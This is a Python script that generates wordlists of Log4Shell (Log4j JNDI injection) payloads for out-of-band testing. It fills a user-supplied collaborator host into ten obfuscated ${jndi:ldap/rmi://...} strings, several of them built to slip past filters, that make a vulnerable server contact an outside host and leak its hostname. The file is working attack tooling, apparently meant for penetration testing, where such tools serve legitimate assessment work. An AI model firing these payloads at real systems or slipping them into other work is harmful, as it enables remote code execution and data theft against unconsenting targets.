#!/usr/bin/python3
import random
import string
import os
import argparse
import urllib.parse
import re


parser = argparse.ArgumentParser(description='example: oob-time-payload-generator.py -c xxx.oast.com -t 10 -td example.com')
parser.add_argument('-c','--collaborator', help='Specify domain or IP to be used for OOB payloads', required=False)
parser.add_argument('-t','--time', help='Time delay for time-based payloads in seconds', required=False)
parser.add_argument('-td','--target-domain', help='Targeted domain', required=False)
args = vars(parser.parse_args())


ip_pattern = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')


dir = 'payloads-' + ''.join(random.choice(string.ascii_lowercase) for i in range(15))
os.mkdir(dir)


wordlists = {}


wordlists['log4j_oob'] = {
'prefix': [''],
'suffix': [''],
'payload':[
'${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:${hostName}.{collaborator}/s2edwin}',
'${${::-j}ndi:rmi://${hostName}.{collaborator}/ass}',
'${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.{collaborator}/s2edwin}',
'${${lower:jndi}:${lower:rmi}://${hostName}.{collaborator}/s2edwin}',
'${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${lower:i}}://${hostName}.{collaborator}/s2edwin}',
'${${lower:n}${lower:d}i:${lower:rmi}://${hostName}.{collaborator}/s2edwin',
'${${lower:n}${lower:d}i:${lower:rmi}://${hostName}.{collaborator}/s2edwin}',
'${jndi:ldap://${hostName}.{collaborator}/badClassName}',
'${jndi:ldap://127.0.0.1#{{${hostName}.{collaborator}}}/{{random}}}',
'${jndi:rmi://${hostName}.{collaborator}}',
]
}


for wordlist in wordlists:
    with open(f'{dir}/{wordlist}.txt', 'w') as f:
        for payload in wordlists[wordlist]['payload']:
            for prefix in wordlists[wordlist]['prefix']:
                for suffix in wordlists[wordlist]['suffix']:
                    line = prefix + payload + suffix
                    if ' ' in line and '/**/' in line: continue # a hack fix for a sensible generation of space bypass
                    if args['collaborator'] != None:
                        if not ip_pattern.match(args['collaborator'].rstrip()):
                            random_string = ''.join(random.choice(string.ascii_lowercase) for i in range(6))
                            line = line.replace('{collaborator}', random_string + '.{collaborator}')
                        line = line.replace('{collaborator}', args['collaborator'])
                    if args['time'] != None: line = line.replace('{time}', args['time'])
                    if args['target_domain'] != None: line = line.replace('{domain}', args['target_domain'])
                    f.write(line + '\n')

